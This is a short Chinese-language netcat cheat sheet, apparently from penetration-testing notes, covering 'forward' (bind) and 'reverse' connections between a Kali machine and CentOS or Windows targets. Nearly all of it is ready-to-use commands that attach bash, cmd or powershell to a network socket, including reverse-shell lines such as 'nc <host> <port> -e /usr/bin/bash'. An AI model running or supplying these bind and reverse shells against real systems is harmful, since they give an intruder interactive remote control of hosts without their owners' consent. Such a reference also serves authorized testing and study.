远程控制工具。

## 1. 正向连接

侦听端口，并在连接后开启终端

```
[root@centos7-6 ~]# nc -lnvp <port> -c bash
```

```
[root@centos7-6 ~]# nc -lnvp <port> -e /usr/bin/bash
```

```
PS C:\Users\Administrator> C:\path\nc.exe -lvnp <port> -e cmd
```

```
PS C:\Users\Administrator> C:\path\nc.exe -lvnp <port> -e powershell
```

连接目标端口

```
┌──(root㉿kali-23)-[~]
└─# nc -nv <ip> <port>
```

```
┌──(root㉿kali-23)-[~]
└─# nc <host> <port>
```

```
PS C:\Users\Administrator> C:\path\nc.exe -nv <ip> <port>
```

```
PS C:\Users\Administrator> C:\path\nc.exe <host> <port>
```

## 2. 反向链接

侦听端口

```
┌──(root㉿kali)-[~]
└─# nc -lnvp <port>
```

```
PS C:\Users\Administrator> C:\path\nc.exe -lvnp <port>
```

连接目标端口，并在连接后开启终端

```
[root@centos7-6 ~]# nc -nv <ip> <port> -c bash
```

```
[root@centos7-6 ~]# nc <host> <port> -e /usr/bin/bash
```

```
PS C:\Users\Administrator> C:\path\nc.exe <host> <port> -e cmd
```

```
PS C:\Users\Administrator> C:\path\nc.exe <host> <port> -e powershell
```

---

References

- [netcat](https://www.kali.org/tools/netcat/)

